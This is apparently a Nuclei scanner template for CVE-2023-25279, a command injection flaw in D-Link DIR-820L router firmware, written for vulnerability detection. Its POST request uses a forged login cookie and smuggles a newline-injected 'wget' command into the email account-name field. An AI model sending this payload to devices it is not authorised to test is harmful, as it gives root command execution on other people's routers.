id: CVE-2023-25279

info:
  name: OS Command Injection in D-Link DIR820LA1_FW105B03
  author: ProjectDiscoveryAI
  severity: critical
  description: OS Command injection vulnerability in D-Link DIR820LA1_FW105B03 allows attackers to escalate privileges to root via a crafted payload.
  impact: |
    Remote attackers can execute arbitrary commands on the affected device.
  remediation: |
    Update to the latest firmware version provided by D-Link to mitigate the vulnerability.
  reference:
    - https://github.com/migraine-sudo/D_Link_Vuln/tree/main/cmd%20Inject%20In%20tools_AccountName
    - https://www.dlink.com/en/security-bulletin/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25279
    cwe-id: CWE-78
    epss-score: 0.0045
    epss-percentile: 0.75863
    cpe: cpe:2.3:o:dlink:dir-820l_firmware:105b03:*:*:*:*:*:*:*
  metadata:
    vendor: dlink
    product: dir-820l_firmware

http:
  - method: POST
    path:
      - "{{BaseURL}}/get_set.ccp"

    headers:
      Content-Type: application/x-www-form-urlencoded
      X-Requested-With: XMLHttpRequest
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
      Origin: http://192.168.0.1
      Referer: http://192.168.0.1/tools_email.asp
      Accept-Encoding: gzip, deflate
      Accept-Language: zh-CN,zh;q=0.9
      Cookie: hasLogin=1
      Connection: close

    body: |
      ccp_act=set&
      ccpSubEvent=CCP_SUB_WEBPAGE_APPLY&
      nextPage=tools_email.asp&
      emailCfg_Enable_1.1.0.0=1&
      emailCfg_EmailFrom_1.1.0.0=aaa&
      emailCfg_EmailTo_1.1.0.0=123&
      emailCfg_SMTPServerAddress_1.1.0.0=123&
      emailCfg_SMTPServerPort_1.1.0.0=25&
      emailCfg_AuthenticationEnable_1.1.0.0=1&
      emailCfg_AccountName_1.1.0.0=%0awget http://192.168.0.2%0a&
      emailCfg_AccountPassword_1.1.0.0=WDB8WvbXdHtZyM8Ms2RENgHlacJghQyGWDB8WvbXdHtZyM8Ms2RENgHlacJghQyG&
      emailCfg_LogOnFullEnable_1.1.0.0=1&
      emailCfg_LogOnScheduleEnable_1.1.0.0=1&
      emailCfg_LogScheduleIndex_1.1.0.0=254&
      1675062771722=1675062771722
    matchers:
      - type: word
        words:
          - "emailCfg_AccountName_1.1.0.0"
        part: body
